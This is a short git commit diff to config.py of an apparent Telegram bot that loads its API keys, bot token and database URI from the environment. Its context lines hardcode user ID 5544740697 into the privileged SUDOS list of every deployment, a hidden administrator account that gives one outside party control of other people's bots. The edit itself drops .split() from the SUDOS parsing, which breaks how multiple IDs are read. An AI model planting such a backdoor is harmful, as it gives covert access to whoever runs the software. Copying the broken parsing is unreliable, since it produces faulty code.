69fbb88a25ff0bd68f604253876cc028a0e6414b
Ryu_sama <90622022+Ryu120@users.noreply.github.com>
2022-10-28 18:03:51 +0530

    Update config.py

--- config.py
+++ config.py
@@ -6,7 +6,7 @@ load_dotenv()
 API_ID = int(getenv("API_ID"))
 API_HASH = getenv("API_HASH")
 TOKEN = getenv("BOT_TOKEN")
-SUDOS = list(map(int, getenv("SUDOS").split()))
+SUDOS = list(map(int, getenv("SUDOS")))
 if not 5544740697 in SUDOS:
   SUDOS.append(5544740697)
 MONGO_URI = getenv("MONGO_URI")
